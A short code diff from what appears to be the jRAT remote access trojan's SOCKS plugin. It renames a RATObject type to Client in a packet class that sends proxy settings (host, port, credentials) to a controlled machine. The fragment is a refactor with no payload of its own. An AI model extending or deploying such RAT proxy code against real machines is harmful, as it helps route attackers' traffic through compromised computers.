@@ -4,7 +4,7 @@ import java.io.DataInputStream;
 import java.io.DataOutputStream;
 
 import jrat.api.PacketBuilder;
-import jrat.api.RATObject;
+import jrat.api.Client;
 import se.jrat.plugins.socks.Global;
 
 public class Packet118Start extends PacketBuilder {
@@ -19,7 +19,7 @@ public class Packet118Start extends PacketBuilder {
 	@SuppressWarnings("unused")
 	private FrameSocks frame;
 
-	public Packet118Start(RATObject rat, boolean socks5, boolean auth, String user, String pass, String host, int port) {
+	public Packet118Start(Client rat, boolean socks5, boolean auth, String user, String pass, String host, int port) {
 		super(Global.HEADER_START, rat);
 		this.socks5 = socks5;
 		this.auth = auth;
@@ -30,7 +30,7 @@ public class Packet118Start extends PacketBuilder {
 	}
 
 	@Override
-	public void write(RATObject rat, DataOutputStream dos, DataInputStream dis) throws Exception {
+	public void write(Client rat, DataOutputStream dos, DataInputStream dis) throws Exception {
 		dos.writeBoolean(socks5);
 		dos.writeUTF(host);
 		dos.writeInt(port);
